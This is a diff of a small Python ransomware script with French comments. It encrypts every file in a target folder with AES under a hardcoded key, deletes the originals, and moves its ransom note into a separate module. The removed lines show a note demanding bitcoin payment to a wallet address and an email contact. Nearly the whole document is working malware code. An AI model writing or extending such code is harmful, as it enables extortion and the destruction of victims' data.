@@ -1,12 +1,11 @@
 import os
 from Crypto.Cipher import AES
-
+from message import message
 
 # Fonction pour remplir les datas à 16 octets
 def pad(data):
     return data + b' ' * (16 - len(data) % 16)
-
-
+ 
 # Fonction de chiffrement
 def encrypt_file(file_path, key):
     cipher = AES.new(key, AES.MODE_ECB)
@@ -18,14 +17,13 @@ def encrypt_file(file_path, key):
         f.write(encrypted_data)
     os.remove(file_path)  # Supprime le fichier original => cible
 
-
-# Clé de 16
+# Clé de 16 octets
 key = b'SixteenByteKey!l'
 
 # Dossier cible
 folder = 'dossier_confidentiel'
 
-# Si le dossier existe
+# Vérifier si le dossier existe
 if os.path.exists(folder):
     print(f"Chiffrement des fichiers dans le dossier : {folder}")
     for filename in os.listdir(folder):
@@ -37,9 +35,4 @@ if os.path.exists(folder):
 else:
     print(f"Erreur : Le dossier '{folder}' est introuvable.")
 
-# Message de rançon
-
-print(" $RANÇON$ ")
-print("Vos fichiers ont été chiffrés. Pour les récupérer, envoyez 1000000 BTC à l'adresse suivante :")
-print("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
-print("Contactez-nous à anneviola@gmail.com après execution du paiement.")
+message()
